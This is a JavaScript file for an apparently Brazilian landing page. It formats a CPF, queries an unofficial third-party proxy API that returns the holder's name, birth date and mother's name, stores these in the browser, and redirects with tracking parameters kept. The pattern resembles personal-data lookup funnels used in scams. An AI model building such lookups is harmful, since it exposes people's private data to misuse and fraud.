// ============================================================
// functions.js — robusto (UTM + CPF + Comprovante) SEM alterar HTML
// ============================================================

const _isHttp = (s) => typeof s === 'string' && /^https?:\/\//i.test(s);
const _isData = (s) => typeof s === 'string' && /^data:image\/[a-zA-Z+.-]+;base64,/i.test(s);

// Cache do comprovante por chave (cpf|name|data|tax)
let _comprovanteCache = {
    key: null,
    src: null
};

// Logs globais
window.addEventListener('error', (e) => {
    console.error('JS Error:', e.message, 'em', e.filename + ':' + e.lineno);
});
window.addEventListener('unhandledrejection', (e) => {
    console.error('Promise rejeitada sem catch:', e.reason);
});

// Persistência dos parâmetros da primeira visita
(function persistLandingQS() {
    try {
        if (!sessionStorage.getItem('landing_qs') && window.location.search.length > 1) {
            sessionStorage.setItem('landing_qs', window.location.search);
        }
    } catch (e) {
        console.warn('[UTM] persist landing qs falhou:', e);
    }
})();

// Função para pegar os parâmetros da URL
function _collectAllParams() {
    const current = new URLSearchParams(window.location.search);
    const landing = sessionStorage.getItem('landing_qs') ? new URLSearchParams(sessionStorage.getItem('landing_qs')) : new URLSearchParams();
    return new URLSearchParams([...current, ...landing].map(([k, v]) => [k, v]));
}

// Redirecionamento preservando os parâmetros
function _buildRedirectWithParams(destHref) {
    const dest = new URL(destHref, window.location.href);
    const allParams = _collectAllParams();
    const merged = new URLSearchParams([...new URLSearchParams(dest.search), ...allParams]);

    dest.search = merged.toString() ? '?' + merged.toString() : '';
    return dest.href;
}

// Fluxo principal (form + redirect preservando parâmetros)
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');
    const cpfInput = document.getElementById('cpf');
    if (!form || !cpfInput) return;

    // Formata CPF
    cpfInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 11) value = value.slice(0, 11);
        if (value.length > 9) {
            value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
        } else if (value.length > 6) {
            value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
        } else if (value.length > 3) {
            value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
        }
        e.target.value = value;
    });

    // Submit com redirect preservando parâmetros
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const cpf = cpfInput.value.replace(/\D/g, '');
        if (cpf.length !== 11) {
            alert('Por favor, digite um CPF válido');
            return;
        }

        const submitButton = form.querySelector('button[type="submit"]');
        const originalButtonText = submitButton.innerHTML;
        submitButton.innerHTML = '<div class="loader" style="display:inline-block;"></div> Consultando...';
        submitButton.disabled = true;

        try {
            const url = `https://apionlineconsulta.vercel.app/api/proxy?cpf=${encodeURIComponent(cpf)}`;
            const data = await fetch(url)
                .then(response => response.json())
                .catch(err => console.error('Erro ao buscar dados:', err));

            if (!data || !data.dadosBasicos) {
                console.error('[CPF] JSON inesperado:', data);
                alert('CPF não encontrado na base de dados.');
                return;
            }

            // Persistência básica
            localStorage.setItem('dadosBasicos', JSON.stringify(data));
            localStorage.setItem('cpf', String(data.dadosBasicos.cpf || cpf).replace(/\D/g, ''));
            localStorage.setItem('name', data.dadosBasicos.nome || '');
            localStorage.setItem('nasc', data.dadosBasicos.nascimento || '');
            localStorage.setItem('name_m', data.dadosBasicos.mae || '');

            // Redirecionamento
            const finalUrl = _buildRedirectWithParams('/new/video/');
            window.location.href = finalUrl;

        } catch (error) {
            alert('Erro ao consultar o CPF. Verifique o console do navegador para detalhes.');
            console.error('[CPF] Falha na consulta:', error);
        } finally {
            submitButton.innerHTML = originalButtonText;
            submitButton.disabled = false;
        }
    });
});
